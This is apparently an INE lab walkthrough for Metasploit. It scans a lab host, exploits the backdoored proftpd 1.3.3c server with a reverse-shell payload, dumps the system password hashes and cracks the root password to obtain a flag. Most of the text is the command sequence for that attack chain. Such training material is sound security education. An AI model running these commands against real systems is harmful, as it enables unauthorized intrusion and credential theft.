# Password Cracker: Linux (Lab)

Auxiliary modules in the Metasploit Framework are versatile components used to perform a wide range of tasks that do not necessarily involve exploiting a vulnerability. These tasks can include scanning, enumeration, fuzzing, cracking hashes, and other network-related activities. Auxiliary modules are an essential part of the penetration testing process as they help gather information, identify potential targets, and assess the security posture of systems and networks.

***

**Step 1:** Open the lab link to access the Kali machine.

<figure><img src="https://assets.ine.com/lab/learningpath/82157bacc4283a3f222777e8969f4877d71121bc307de244de23dfe21e4ea32d.jpg" alt=""><figcaption></figcaption></figure>

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/f50cba841e970fc3cc26d34815cda3ebb6843817ce9b07d50869095767cf9b5d.jpg" alt=""><figcaption></figcaption></figure>

The target is reachable.

**Step 3:** Run an nmap scan against the target:

**Command:**

```
nmap -sS -sV demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/0c2693b0cc70368e48c1a4ae22b630fae6c45715277c320eb019bd954c6dc63e.jpg" alt=""><figcaption></figcaption></figure>

**Step 4:** We have discovered a proftpd 1.3.3c server running on the target machine. We will run nmap vuln script to identify the vulnerability.

**Command:**

```
nmap --script vuln -p 21 demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/3e8317194bdd9ebaedc5c5a3ddc24f97062da2d6c18e00cc8952f9da14e8d40f.jpg" alt=""><figcaption></figcaption></figure>

The target proftpd installation has been running a backdoored version.

**Step 5:** We will start the postgresql database server on the attacker machine. We are starting postgresql to store all metasploit loot and other sensitive information from the target machine.

**Command:**

```
/etc/init.d/postgresql start
```

<figure><img src="https://assets.ine.com/lab/learningpath/e171122e6bd0afba77d8c6f3e30c24a352f2630ad81251c9024cbc261b8cd9dc.jpg" alt=""><figcaption></figcaption></figure>

**Step 6:** We have started postgresql database server. Start metasploit framework and exploit proftpd server using exploit/unix/ftp/proftpd\_133c\_backdoor module.

Make sure to replace LHOST with the IP address of the attacker machine.

**Commands:**

```
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
exploit -z
```

<figure><img src="https://assets.ine.com/lab/learningpath/745ad12973f754da8faf7651ceb9ef6efe9a2de11bda5823853071ed4f9a86ba.jpg" alt=""><figcaption></figcaption></figure>

**Step 7:** We have exploited the target ftp server. We will use a post exploitation module to dump the system users hashes.

**Commands:**

```
use post/linux/gather/hashdump
set SESSION 1
exploit
```

<figure><img src="https://assets.ine.com/lab/learningpath/f7abf6bd169b8bdda37b46c45c5d04f20f330abc1b3607b752b039872432cdf7.jpg" alt=""><figcaption></figcaption></figure>

**Step 8:** Run the provided auxiliary module to find the plain text password of the root user.

**Command:**

```
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

<figure><img src="https://assets.ine.com/lab/learningpath/3d61da62280f5d9ffebd72d7d3637bda832450158fb0262dde9b1d06e9517c54.jpg" alt=""><figcaption></figcaption></figure>

This reveals the flag to us.

**Flag:** password

## Conclusion

In this lab, we exploited a vulnerable application, peformed a hash dump and cracked the hash as well, all using metasploit modules.

## References

* Metasploit Modules
  * https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd\_133c\_backdoor
  * http://rapid7.com/db/modules/post/linux/gather/hashdump
  * https://www.rapid7.com/db/modules/auxiliary/analyze/crack\_linux
* [Proftpd Backdoored](https://www.aldeid.com/wiki/Exploits/proftpd-1.3.3c-backdoor)
